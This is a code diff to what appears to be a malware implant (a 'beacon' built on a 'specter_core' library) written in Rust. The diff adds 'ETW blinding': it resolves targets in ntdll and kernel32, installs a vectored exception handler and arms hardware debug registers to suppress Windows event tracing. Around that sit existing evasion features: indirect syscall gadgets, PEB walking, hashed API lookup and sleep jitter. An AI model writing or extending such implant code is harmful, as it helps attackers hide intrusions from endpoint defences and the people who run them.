@@ -14,11 +14,14 @@ use core::ffi::c_void;
 use specter_core::config;
 use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
 use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
+use specter_core::hwbp::Hooks;
 use specter_core::peb::{self, Peb};
 use specter_core::rng::XorShift64;
 use specter_core::sleep::sleep_with_jitter;
 use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
 use specter_core::time::{filetime_to_unix_epoch, is_expired};
+
+use crate::runtime::hwbp as beacon_hwbp;
 
 use crate::runtime::syscalls::{self, Syscalls};
 
@@ -33,6 +36,8 @@ pub struct Instance {
     /// heap is optional until phase 3 buffering needs it).
     pub heap: Option<heap::Heap>,
     pub syscalls: Syscalls,
+    /// ETW blinding hooks (Dr slots; disabled slots are zero).
+    pub etw_hooks: Hooks,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
     pub exit_thread: unsafe extern "system" fn(u32),
     pub rng: XorShift64,
@@ -136,6 +141,22 @@ unsafe fn bootstrap() -> Option<Instance> {
         return None;
     }
 
+    // ETW blinding: resolve the hook targets and the VEH installer, then
+    // install the handler and arm the debug registers. Any failure simply
+    // leaves the hooks disabled — the beacon keeps running.
+    let (etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
+    if add_veh != 0
+        && syscall_table.get_ctx_ssn != u32::MAX
+        && syscall_table.set_ctx_ssn != u32::MAX
+    {
+        let add_veh = *(add_veh
+            as *const unsafe extern "system" fn(
+                u32,
+                *mut core::ffi::c_void,
+            ) -> *mut core::ffi::c_void);
+        beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
+    }
+
     // Seed the jitter RNG from the performance counter; a failed read falls
     // back to the remapped zero seed (never zero-stuck).
     let mut counter: i64 = 0;
@@ -164,6 +185,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         kernel32,
         heap,
         syscalls: syscall_table,
+        etw_hooks,
         get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
         exit_thread,
         rng,
